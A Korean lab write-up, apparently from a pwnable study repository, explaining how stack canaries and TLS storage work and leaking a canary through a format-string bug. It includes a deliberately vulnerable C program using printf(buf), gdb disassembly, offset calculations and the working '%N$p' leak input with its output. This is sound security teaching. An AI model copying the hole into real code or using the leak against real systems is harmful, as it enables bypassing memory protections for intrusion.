# fsb-canary-leak

## 1. 개요

Stack Canary는 스택 버퍼 오버플로우로 saved RET이 덮이는 것을 감지해 프로그램을 종료시키는 보호기법이다.</br>
이번 실습에서는 canary 값을 leak해보는 것이 목표이다.</br> 
이는 다음 실습에서 overflow payload에 canary를 복원하여 RET overwrite를 성공시키는 것에 사용될 것이다.

이를 위해 우선 canary가 무엇이며, 어디에 저장되고 어떻게 검사되는지 알아본다.

---

## 2. Stack Canary란?

**Stack Canary**는
스택 버퍼 오버플로우로 인해 **saved return address가 덮이는 것을 탐지하기 위한 보호기법**이다.

함수의 스택 프레임에서
지역 변수와 saved RET 사이에 **무작위 값(canary)** 을 삽입하고,
함수 종료 시 이 값이 변조되었는지를 검사한다.

만약 canary 값이 변조되었다면,
프로그램은 return address를 사용하기 전에 즉시 종료(abort)된다.

Stack Canary의 목적은 **control flow가 탈취되기 전에 프로그램을 강제 종료하는 것** 이다.

즉, Stack Canary는 saved RET overwrite를 사전에 감지하기 위한 센서 역할을 한다.
 
### 2.1 스택 배치 (32-bit 기준)

Stack Canary가 활성화된 함수의 스택 구조는 다음과 같다.

```
높은 주소
+----------------+
| saved RET      |
+----------------+
| saved EBP      |
+----------------+
| canary 🐤      |  ← Stack Canary
+----------------+
| local buffer   |
| local buffer   |
+----------------+
낮은 주소
```

지역 버퍼(`buf`)를 넘쳐 쓰는 경우,
saved RET에 도달하기 전에 **canary가 먼저 덮이게 된다.**


### 2.2 Canary 값의 특징

* 실행 시 무작위로 생성됨
* 프로세스(정확히는 스레드)마다 다름
* **하위 1바이트가 0x00**

  * 문자열 함수(`strcpy`, `gets` 등)로 덮기 어렵게 하기 위함

---

## 3. Canary 동작 방식

### 3.1 함수 진입 시 (prologue)

함수에 진입하면,
프로세스(정확히는 스레드)마다 유지되는 **canary 원본 값**이
스택에 복사된다.

``` asm
mov eax, gs:0x14      ; TLS에 있는 canary 값 읽기
mov [ebp-0xc], eax   ; 스택에 canary 저장
```


### 3.2 함수 종료 시 (epilogue)

함수 종료 직전, 스택에 저장된 canary 복사본과
원본 canary 값을 비교한다.

```asm
mov eax, [ebp-0xc]   ; stack canary copy
xor eax, gs:0x14     ; original canary
jne __stack_chk_fail
```

xor 연산은 두 값이 같을 경우 0이 되며, 이를 통해 canary의 무결성을 검사한다.

* 두 값이 같으면 `xor` 결과는 0 → 정상 return
* 값이 다르면 `__stack_chk_fail()` 호출 → 프로그램 종료

이로 인해,
**canary가 깨진 상태에서는 return address가 사용되지 않는다.**

canary가 깨지면 프로그램은 다음과 같이 끝난다.

```
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

---

## 4. 스레드(Thread)와 TLS (Thread Local Storage)

### 4-1. 스레드(Thread)란?

**스레드(Thread)** 는 **CPU가 독립적으로 실행하는 하나의 실행 흐름**이다.

운영체제 입장에서,
실제로 스케줄링하고 실행하는 최소 단위는 **프로세스가 아니라 스레드**다.

#### 프로세스와 스레드의 관계

프로그램을 실행하면:

1. 프로세스(Process)가 생성되고
2. 그 안에 최소 1개의 스레드(main thread) 가 만들어진다.

```
프로세스
 └─ 스레드 1 (main thread)
```

멀티스레드 프로그램의 경우:

```
프로세스
 ├─ 스레드 1
 ├─ 스레드 2
 └─ 스레드 3
```

모든 스레드는 **같은 프로세스의 메모리 공간을 공유**하지만,
각 스레드는 **자신만의 실행 상태**를 가진다.

스레드마다 따로 가지는 것:

* 스택(Stack)
* 레지스터 상태
* TLS (Thread Local Storage)

스레드가 공유하는 것:

* 코드 영역 (`.text`)
* 전역 변수 (`.data`, `.bss`)
* 힙(Heap)
* 라이브러리(libc 등)

#### 왜 Stack Canary는 스레드 기준인가?

Stack Canary는 **스택을 보호하기 위한 값**이다.

* 스택은 스레드마다 다르므로
* canary 역시 **스레드마다 독립적**이어야 한다.

따라서:

* 각 스레드는 자신만의 canary 값을 가지며
* 이 canary의 **원본 값은 TLS(Thread Local Storage)** 에 저장된다.


### 4.2 TLS란?

TLS란 **스레드마다 따로 있는 전용 저장공간**을 말한다.

Stack Canary의 **원본 값**은
스택이 아닌 **TLS(Thread Local Storage)** 에 저장된다.

그 이유는 다음과 같다.

* 스택은 공격자가 덮을 수 있음
* canary 원본은 안전한 위치에 있어야 함
* 스레드마다 독립적인 canary가 필요함

따라서:

* **TLS** : canary 원본
* **스택** : canary 복사본

이라는 구조를 사용한다.



### 4.3 gs:0x14의 의미 (32-bit)

x86 32-bit Linux 환경에서:

* `gs` 레지스터 → 현재 스레드의 TLS 베이스
* `gs:0x14` → TLS에서 +0x14 위치에 있는 값

gs:0x14에 들어 있는 값은 **stack canary의 원본 값**이다.

32-bit Linux(glibc) 기준으로:
```
TLS + 0x14 → __stack_chk_guard
```
* 프로세스 시작 시 랜덤 생성
* 스레드마다 하나
* 직접 접근하지 못하도록 숨겨둔 값

즉,

```asm
mov eax, gs:0x14
```

이는 *현재 스레드의 Stack Canary 원본을 읽어온다* 라는 의미다.

> **노트 ── TLS의 페이지 권한**
>
> TLS의 페이지 권한 자체는 **RW**
> 즉, 커널 레벨에서 쓰기 금지를 걸어둔 것은 아니다.
>
> 그러나 TLS는 일반 주소로 접근하지 않고,
> * **세그먼트 레지스터(gs)** 기반 접근
> * 일반 포인터처럼 접근 불가
> * C 코드에서 주소를 쉽게 얻을 수 없음
>
> 권한 자체로는 쓰기 가능이지만, TLS 원본을 덮는 것은 매우 어렵다.
>
> 따라서 실전 공격에서는 TLS의 canary 원본을 직접 덮는 것이 아니라,
> 스택에 복사된 canary 값을 leak하여 그대로 복원하는 방식을 사용한다.


### 4.4 메모리 배치 개념도

#### 프로세스 기준

프로세스 하나의 가상 메모리 구조:

```
높은 주소
+------------------------+
|        Stack           |  ← 스레드마다 따로 있음
|------------------------|
|        TLS             |  ← 스레드마다 따로 있음
|------------------------|
|        Heap            |  ← 모든 스레드가 공유
|------------------------|
|   .data / .bss         |  ← 전역 변수 (공유)
|------------------------|
|        .text           |  ← 코드 (공유)
+------------------------+
낮은 주소
```

#### 스레드가 1개일 때

```
프로세스
 └─ 스레드 1
     ├─ Stack
     └─ TLS
```

이를 메모리를 풀어 쓰면:

```
높은 주소
+------------------------+
|  Stack (thread 1)      |
|                        |
|   [ saved RET ]        |
|   [ saved EBP ]        |
|   [ canary copy ] 🐤   |
|   [ local buf ]        |
+------------------------+
|  TLS (thread 1)        |
|   [ canary 원본 ] 🐤   | ← gs:0x14
+------------------------+
|  Heap                  |
+------------------------+
|  .data / .bss          |
+------------------------+
|  .text                 |
+------------------------+
낮은 주소
```

#### 스레드가 여러 개일 때

```
프로세스
 ├─ 스레드 1
 │    ├─ Stack 1
 │    └─ TLS 1 (canary A)
 └─ 스레드 2
      ├─ Stack 2
      └─ TLS 2 (canary B)
```

메모리로 보면:

```
Stack 1        Stack 2
TLS 1          TLS 2
(canary A)    (canary B)
```

---

## 5. FSB를 통한 Canary Leak

### 5.1 환경

* ASLR : ON
* RELRO : partial RELRO
* CANARY : ON
* NX : ON
* PIE : OFF


### 5.2 실습 코드
``` c
// filename: vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vuln() {
    char buf[64];

    puts("input:");
    fgets(buf, sizeof(buf), stdin);

    printf(buf);   // Format String Vulnerability
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    puts("done");
    return 0;
}
```

* `printf(buf)` → format string vulnerability로 leak 가능


### 5.3 Canary 확인

gdb에서 `vuln`을 disassemble한 결과:

프롤로그
``` gdb
0x080491a6 <+0>:	push   ebp
0x080491a7 <+1>:	mov    ebp,esp
0x080491a9 <+3>:	push   ebx
0x080491aa <+4>:	sub    esp,0x54
0x080491ad <+7>:	call   0x80490e0 <__x86.get_pc_thunk.bx>
0x080491b2 <+12>:	add    ebx,0x2e42
0x080491b8 <+18>:	mov    eax,gs:0x14
0x080491be <+24>:	mov    DWORD PTR [ebp-0xc],eax
```

* gs:0x14에 저장되어 있는 원본 canary를 eax에 복사
* 복사한 원본 카나리를 스택의 [ebp-0xc]에 기록

에필로그
``` gdb
0x080491ff <+89>:	mov    eax,DWORD PTR [ebp-0xc]
0x08049202 <+92>:	sub    eax,DWORD PTR gs:0x14
0x08049209 <+99>:	je     0x8049210 <vuln+106>
0x0804920b <+101>:	call   0x8049290 <__stack_chk_fail_local>
0x08049210 <+106>:	mov    ebx,DWORD PTR [ebp-0x4]
0x08049213 <+109>:	leave
0x08049214 <+110>:	ret
```

* [ebp-0xc]에 기록되어 있는 값을 eax에 복사
* `eax - gs:0x14` 수행 </br>
  → 스택에 저장된 canary 복사본과 TLS에 있는 canary 원본을 비교
* 두 값이 **같을 경우**, 연산 결과가 0이 되며 **ZF(Zero Flag)가 set됨**
* ZF가 set된 경우 `je` 분기가 수행되어 정상적으로 함수가 return됨
* 값이 다를 경우 `__stack_chk_fail_local()`이 호출되어 프로그램이 즉시 종료됨

즉, 함수 종료 시점에 **canary 값이 변조되었는지 여부를 검사**하고,
canary가 깨진 경우 saved return address를 사용하기 전에 프로그램을 종료한다.


### 5.4 Canary 위치와 스택 구조

위 disassembly 결과를 통해 `vuln()` 함수의 스택 프레임에서
canary 복사본이 저장되는 위치를 확인할 수 있다.

```asm
mov DWORD PTR [ebp-0xc], eax
```

따라서:

* canary 복사본 위치: **`ebp - 0xc`**
* buf 시작 위치: **`ebp - 0x4c`**

두 값 사이의 거리:

```
0x4c - 0x0c = 0x40 (64 bytes)
```

즉, `buf`의 시작 주소로부터 **64바이트 위쪽에 canary 복사본이 위치**한다.



### 5.5 Format String Vulnerability로 Canary Leak

`printf(buf)` 호출 시, `printf`는 전달된 인자 외에도
스택 상의 값을 **가변 인자(varargs)** 라고 착각하고 순차적으로 읽는다.

이때 `printf`가 읽는 값들은 다음 순서로 확장된다.

```
printf 인자 영역
→ vuln()의 buf
→ vuln()의 canary copy
→ saved ebx
→ saved ebp
→ saved ret
```

`printf`의 positional parameter 문법(`%N$p`)을 사용하면
스택의 특정 슬롯에 위치한 값을 직접 출력할 수 있다.



### 5.6 Canary offset 계산

`buf`가 `printf` 출력에서 관측된 offset은 `%7$p` 근처였으며,
`buf`와 canary 사이의 거리는 64바이트이므로:

```
64 bytes / 4 bytes = 16 slots
```

따라서 canary는:

```
7 + 16 = 23
```

23번째 슬롯에서 출력될 것으로 예상할 수 있다.

스택 다이어그램:
```
높은주소
+-------------+
|  saved ret  |
+-------------+
|  saved ebp  |
+-------------+ ← ebp
|  saved ebx  |
+-------------+
|     ...     |
+-------------+
|   canary🐤  |
+-------------+ [ebp-0xc]
|     ...     |
+-------------+ 
|     buf     |
+-------------+ [ebp-0x4c]
|     ...     |
+-------------+
|  fmt(&buf)  | printf 첫 번째 인자
+-------------+
낮은주소
```

> **노트**
> 
> printf는 fmt 이후의 스택 값을 가변 인자라고 착각하고 4바이트 단위로 순차적으로 읽는다.


### 5.7 Canary leak 확인

입력:

```text
%20$p %21$p %22$p %23$p %24$p %25$p %26$p
```

출력:

```text
0xff8c688c 0xeabdfb60 0xff8c67b8 0xe9dbe600 0xeab89d40 0x804bff4 0xff8c67b8
```

`%23$p`에서 출력된 `0xe9dbe600` 값은,
같은 실행 흐름에서 gdb로 확인한 canary 복사본 값과 일치한다.

```gdb
(gdb) x/wx $ebp-0xc
0xff8c678c:  0xe9dbe600
```

이를 통해 Format String Vulnerability를 이용해
**`vuln()` 함수 스택 프레임에 복사된 canary 값을 leak할 수 있음**을 확인했다.

gdb 실행 화면:
![gdb](https://github.com/sage-502/pwnable-lab/blob/main/images/fsb-canary-leak/01.png)

---

## 6. 정리

* Stack Canary의 원본 값은 TLS(`gs:0x14`)에 저장됨
* 함수 진입 시, 해당 값이 스택 프레임에 복사됨
* `printf(buf)`를 통해 **caller 함수의 스택 프레임에 있는 canary 복사본이 leak됨**
* leak된 canary 값은 이후 overflow payload에 그대로 복원하여
  Stack Canary 보호를 우회하는 데 사용할 수 있다
